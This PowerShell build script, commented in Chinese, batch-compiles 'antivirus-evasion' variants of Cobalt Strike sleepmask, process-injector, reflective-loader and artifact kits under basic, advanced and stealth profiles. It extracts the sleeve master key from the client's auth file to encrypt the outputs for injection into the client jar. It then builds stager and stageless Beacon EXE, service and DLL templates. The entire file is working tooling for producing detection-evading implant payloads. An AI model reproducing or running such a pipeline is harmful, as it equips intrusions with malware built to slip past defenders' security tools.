<#
  cs_dev :: build_library.ps1  --  预编译全部免杀档案变体
  ==========================================================================
  把「档案 × 模块」的所有组合一次性编译并加密, 存入 library/。
  之后 CS 插件切换档案只需从 library 取文件注入 jar, 无需 gcc / WSL, 秒级完成。

  产物 (library/):
      sleepmask.<profile>.x64.o.enc     已按 CS sleeve 格式加密
      injector.<profile>.x64.o.enc
      udrl.<profile>.x64.o.enc
      artifact64.<profile>.exe          明文 (CS 直接读 resources/)

  用法:
      .\build_library.ps1                 构建全部档案
      .\build_library.ps1 -Profiles basic,stealth
#>
[CmdletBinding()]
param(
    [string[]] $Profiles = @('basic','advanced','stealth'),
    [string]   $MinGw = ''
)

$ErrorActionPreference = 'Stop'
$ToolsDir  = $PSScriptRoot
$DevDir    = Split-Path -Parent $ToolsDir
$LibDir    = Join-Path $DevDir 'library'
$WorkDir   = Join-Path $DevDir 'build\_libwork'
$Jar       = Join-Path (Split-Path -Parent $DevDir) 'cobaltstrike-client.jar'
$AuthFile  = Join-Path (Split-Path -Parent $DevDir) 'cobaltstrike.auth'
$PubKey    = Join-Path $DevDir 'build\authkey.pub'
$CryptBuild= Join-Path $ToolsDir 'build'

function Say($m,$c='Gray'){ Write-Host $m -ForegroundColor $c }

if (-not $MinGw) {
    foreach ($c in @((Join-Path (Split-Path -Parent $DevDir) '_tools\mingw64\bin'), 'D:\mingw64\bin')) {
        if (Test-Path (Join-Path $c 'gcc.exe')) { $MinGw = $c; break }
    }
}
$Gcc  = Join-Path $MinGw 'gcc.exe'
$Java = 'C:\Program Files\Java\jdk-17\bin\java.exe'

New-Item -ItemType Directory -Force -Path $LibDir, $WorkDir | Out-Null

# ---- 档案编译开关映射 ----------------------------------------------------
$DEFINES = @{
    'basic'    = @('CS_DEV_LEGACY_PATCH','CS_DEV_NO_RECYCLEDGATE','CS_DEV_NO_STACKSPOOF')
    'advanced' = @('CS_DEV_NO_STACKSPOOF')
    'stealth'  = @()
}

# ---- 取 sleeve 主密钥 ----------------------------------------------------
Say "[*] extracting sleeve master key ..."
if (-not (Test-Path (Join-Path $CryptBuild 'SleeveCrypt.class'))) {
    $javac = Join-Path (Split-Path $Java -Parent) 'javac.exe'
    & $javac -encoding UTF-8 -d $CryptBuild (Join-Path $ToolsDir 'SleeveCrypt.java') | Out-Null
}
$keyLine = & $Java -cp $CryptBuild SleeveCrypt key $PubKey $AuthFile 2>&1 |
           Where-Object { $_ -match 'master key = ([0-9a-f]+)' }
if (-not $keyLine) { throw "master key extraction failed" }
$KEY = [regex]::Match($keyLine,'master key = ([0-9a-f]+)').Groups[1].Value
Say "[+] sleeve key: $($KEY.Substring(0,16))..." 'Green'

# ---- 编译 + 加密 ---------------------------------------------------------
function Build-One($kind, $profile) {
    $defs = $DEFINES[$profile]
    $src  = switch ($kind) {
        'sleepmask' { Join-Path $DevDir 'kits\sleepmask\sleepmask.c' }
        'injector'  { Join-Path $DevDir 'kits\injector\injector.c' }
        'udrl'      { Join-Path $DevDir 'kits\udrl\udrl.c' }
    }
    if (-not (Test-Path $src)) { return $null }

    $obj = Join-Path $WorkDir "$kind.$profile.x64.o"
    $cmdArgs = @('-DWIN_X64') + ($defs | ForEach-Object { "-D$_" }) + @(
        '-shared','-Wall','-Wno-pointer-arith','-Wno-unused-function',
        '-Wno-unused-variable','-Wno-cast-function-type','-O2',
        '-fno-asynchronous-unwind-tables','-fno-ident','-c',$src,'-o',$obj)
    if ($kind -eq 'udrl') {
        $cmdArgs = @('-DWIN_X64') + ($defs | ForEach-Object { "-D$_" }) + @(
            '-shared','-Wall','-Wno-pointer-arith','-O2','-nostdlib',
            '-fno-asynchronous-unwind-tables','-fno-ident','-c',$src,'-o',$obj)
    }
    & $Gcc @cmdArgs 2>&1 | Out-Null
    if (-not (Test-Path $obj)) { Say "    [-] $kind/$profile build FAILED" 'Red'; return $null }

    # 加密为 CS sleeve 资源格式
    $enc = Join-Path $LibDir "$kind.$profile.x64.o.enc"
    & $Java -cp $CryptBuild SleeveCrypt encraw $KEY $obj $enc | Out-Null
    if (-not (Test-Path $enc)) { Say "    [-] $kind/$profile encrypt FAILED" 'Red'; return $null }
    return (Get-Item $enc).Length
}

function Build-Artifact($profile) {
    $src  = Join-Path $DevDir 'kits\artifact\artifact64.c'
    $defs = @($DEFINES[$profile] | ForEach-Object { "-D$_" })

    # 三种载体 x 两种预留规格, 对应 CS 的 12 个模板:
    #   small 系列 -> stager 载荷 (几 KB)      jar 内: artifact64.exe / artifact64svc.exe / artifact64.x64.dll
    #   big   系列 -> stageless 载荷 (完整 Beacon DLL, 200-300KB)
    #                                          jar 内: artifact64big.exe / artifact64svcbig.exe / artifact64big.x64.dll
    # 少覆盖任一规格都会让对应输出格式退回原版模板 (原版 svc 双击无反应).
    $forms = @(
        [pscustomobject]@{ ext='.exe'; small='artifact64';    big='artifact64big';    pre=@('-mwindows');                                     post=@();             defs=@() }
        [pscustomobject]@{ ext='.exe'; small='artifact64svc'; big='artifact64svcbig'; pre=@('-Wl,-subsystem,windows','-Wl,-e,mainCRTStartup'); post=@('-ladvapi32'); defs=@('-DCS_DEV_SVC') }
        [pscustomobject]@{ ext='.dll'; small='artifact64dll'; big='artifact64bigdll'; pre=@('-shared','-nostartfiles','-Wl,-e,_DllMainCRTStartup'); post=@();       defs=@('-DCS_DEV_DLL') }
    )

    $built = @()
    foreach ($fm in $forms) {
        foreach ($spec in @(@{ stem = $fm.small; big = $false }, @{ stem = $fm.big; big = $true })) {
            $out = Join-Path $LibDir "$($spec.stem).$profile$($fm.ext)"
            if (Test-Path $out) { Remove-Item $out -Force }
            $sizeDef = if ($spec.big) { @('-DCS_DEV_BIG') } else { @() }
            $cmdArgs = @('-DWIN_X64') + $defs + $fm.defs + $sizeDef +
                       @('-O2','-s','-fno-ident') + $fm.pre + @('-o',$out,$src) + $fm.post
            & $Gcc @cmdArgs 2>&1 | Out-Null
            if (-not (Test-Path $out)) {
                Say "    [-] $($spec.stem)/$profile build FAILED" 'Red'
            } else {
                $built += [pscustomobject]@{ Name = (Split-Path $out -Leaf); Size = (Get-Item $out).Length; Path = $out }
            }
        }
    }
    return $built
}

Say ""
Say "=== building evasion variant library ===" 'Cyan'
$total = 0
foreach ($p in $Profiles) {
    Say ""
    Say "  [$p]" 'White'
    foreach ($k in @('sleepmask','injector','udrl')) {
        $sz = Build-One $k $p
        if ($sz) { Say ("    {0,-12} {1,6} bytes (enc)" -f $k, $sz) 'Green'; $total++ }
    }
    foreach ($a in @(Build-Artifact $p)) {
        Say ("    {0,-32} {1,6} bytes (plain)" -f $a.Name, $a.Size) 'Green'
        $total++
    }
}

Say ""
Say "=== done: $total variants -> $LibDir ===" 'Cyan'
Get-ChildItem $LibDir | Select-Object @{n='KB';e={[math]::Round($_.Length/1KB,1)}},Name | Format-Table -AutoSize
